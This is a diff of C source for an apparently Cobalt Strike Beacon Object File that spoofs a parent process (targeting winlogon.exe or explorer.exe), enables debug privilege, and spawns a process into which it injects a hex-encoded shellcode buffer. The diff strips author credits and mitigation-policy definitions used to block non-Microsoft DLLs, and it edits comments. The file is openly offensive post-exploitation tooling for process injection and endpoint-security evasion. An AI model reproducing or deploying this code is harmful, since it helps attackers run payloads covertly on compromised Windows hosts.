@@ -2,46 +2,6 @@
 #include "bofdefs.h"
 #include "base.c"
 
-
-// Author: Bobby Cooke (@0xBoku) // SpiderLabs // github.com/boku7 // https://www.linkedin.com/in/bobby-cooke/ // https://0xboku.com
-// Credit/shoutout to: Adam Chester @_xpn_ + @SEKTOR7net + Raphael Mudge
-// Thank you for the amazing work that you've contributed. I would not be able to publish this without your blogs, videos, and awesome content!
-// Main References for PPID Spoofing & blockdll
-// - https://blog.xpnsec.com/protecting-your-malware/
-// - https://blog.cobaltstrike.com/2021/01/13/pushing-back-on-userland-hooks-with-cobalt-strike/
-// - https://institute.sektor7.net/ (Courses)
-// - https://github.com/ajpc500/BOFs 
-
-#define intZeroMemory(addr,size) MSVCRT$memset((addr),0,size)
-
-// Bug Fix (07/20/21) - Compiling issues with on Kali
-// macos compiled fine, but on kali some definitions were not included. Manually defined them here. 
-// Successful compilation on:
-// - Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux
-// - x86_64-w64-mingw32-gcc (GCC) 10-win32 20210110
-// Defined in WinBase.h on windows system - has "2" at end to avoid duplicate declaration warnings/errors on macOS
-#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2   0x0000100000000000
-
-// grep -ir "PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON" /usr/local/Cellar/mingw-w64/9.0.0/toolchain-x86_64/x86_64-w64-mingw32/include/        
-// /usr/local/Cellar/mingw-w64/9.0.0/toolchain-x86_64/x86_64-w64-mingw32/include/winbase.h:#define PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON (0x0001ULL << 36)
-#define PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON2 0x0000001000000000
-
-#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY2 0x00020007
-#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS2    0x00020000
-/*                              RCX           RDX               R8                            R9      [RSP+0x0]     [RSP+0x8] [RSP+0x10]
-UpdateProcThreadAttribute(si.lpAttributeList,   0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy),    NULL,     NULL);
-00007FF6BF71195A  mov         qword ptr[rsp + 30h], 0
-	00007FF6BF711963  mov         qword ptr[rsp + 28h], 0
-	00007FF6BF71196C  mov         qword ptr[rsp + 20h], 8
-	00007FF6BF711975  lea         r9, [policy]
-	00007FF6BF71197C  mov         r8d, 20007h
-	- R8D = PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 20007h = 0x00020007 = DWORD 4 bytes
-*/
-typedef struct _STARTUPINFOEXA2 {
-    STARTUPINFOA StartupInfo;
-    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
-} STARTUPINFOEXA2, *LPSTARTUPINFOEXA2;
-
 void EnableDebugPriv( LPCSTR priv ) 
 {
 	HANDLE hToken;
@@ -75,8 +35,7 @@ void EnableDebugPriv( LPCSTR priv )
 	KERNEL32$CloseHandle( hToken );
 }
 
-// code taken from here
-// https://gist.github.com/G0ldenGunSec/8ca0e853dd5637af2881697f8de6aecc
+// code taken from: https://gist.github.com/G0ldenGunSec/8ca0e853dd5637af2881697f8de6aecc
 int get_pid_of(char* target_process){
 	HMODULE hMods[256];
 	DWORD aProcesses[300];
@@ -115,7 +74,7 @@ int get_pid_of(char* target_process){
     return -1;
 }
 
-// code taken from here https://github.com/boku7/spawn
+// code taken from: https://github.com/boku7/spawn
 void SpawnProcess(char * peName, DWORD ppid, unsigned char * shellcode, SIZE_T shellcode_len){
     // Declare variables/struct
     // Declare booleans as WINBOOL in BOFs. "bool" will not work
@@ -247,7 +206,7 @@ void SpawnProcess(char * peName, DWORD ppid, unsigned char * shellcode, SIZE_T s
 }
 
 void run(char * peName, unsigned char * shellcode, SIZE_T shellcode_len){
-    // enable debug privilege to get the token of protected process
+    // enable debug privilege to get the handles of protected process
     EnableDebugPriv(SE_DEBUG_NAME);
     
     // Get the pid of winlogon.exe
@@ -302,7 +261,6 @@ int main()
 "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74"
 "\x65\x70\x61\x64\x2e\x65\x78\x65\x00";
 
-    // Get the pid of winlogon.exe
     run("explorer.exe", buf, sizeof(buf));
 }
 
